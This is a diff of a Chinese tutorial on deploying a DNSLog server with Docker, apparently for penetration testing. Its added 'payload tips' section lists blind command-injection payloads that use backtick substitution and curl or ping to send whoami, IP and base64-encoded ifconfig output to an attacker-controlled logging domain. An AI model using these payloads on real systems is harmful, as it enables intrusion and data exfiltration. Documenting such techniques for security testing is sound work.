@@ -40,7 +40,7 @@ NS	*.0v0.com	ns2.code2sec.com
 
 dockerfile内容如下
 
-```
+```dockerfile
 FROM ubuntu:14.04
 
 RUN sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list
@@ -61,7 +61,7 @@ EXPOSE 80
 
 下载 `dnslog/dnslog/settings.py`并对如下字段进行对应的修改，保持settings.py：
 
-```
+```python
 # 做 dns 记录的域名
 DNS_DOMAIN = '0v0.com'
 
@@ -78,13 +78,13 @@ SERVER_IP = '10.11.12.13'
 
 创建一个dnslog的启动脚本，保存为start.sh：
 
-```
+```bash
 python manage.py runserver 0.0.0.0:80 &
 ```
 
 准备好如上3个文件后，可以构建镜像了
 
-```
+```bash
 docker build .
 docker tag e99c409f6585 bit4/dnslog
 docker run -it -p 80:80 -p 53:53/udp bit4/dnslog
@@ -120,3 +120,61 @@ yyy.test.0v0.com
 更多详细问题参考项目https://github.com/BugScanTeam/DNSLog
 
 **记得修改默认的账号密码！**
+
+
+
+### 0x4、payload使用技巧
+
+兼容windows和linux的命令
+
+```bash
+ipconfig || ifconfig
+#||是或逻辑， 如果第一个命令执行成功，将不会执行第二个；而如果第一个执行失败，将会执行第二个。
+
+使用实例：
+ping -n 3 xxx.test.0v0.com || ping -c 3 xxx.test.0v0.com
+```
+
+
+
+命令优先执行
+
+```bash
+%OS%
+#windows的系统变量，用set命令可以查看所有可用的变量名称
+`whomai` 
+#linux下的命令优先执行,注意是反引号（`）这个字符一般在键盘的左上角，数字1的左边
+
+测试效果如下:
+root@ubuntu:~# echo `whoami`@bit4
+root@bit4
+
+E:\>echo %OS%@bit4
+Windows_NT@bit4
+
+使用实例：
+curl "http://xxx.test.0v0.com/?`whoami`"
+ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com
+#DNS记录中获取源IP地址
+```
+
+![command_first](img/docker+dnslog/command_first.png)
+
+消除空格
+
+```bash
+id|base64
+
+使用实例：
+curl test.0v0.com/`ifconfig|base64|tr '\n' '-'`
+```
+
+![base64](img/docker+dnslog/base64.png)
+
+window下的curl
+
+```bash
+start http://xxxxxxxxx.test.0v0.com
+#该命令的作用是通过默认浏览器打开网站，缺点是会打开窗口
+```
+
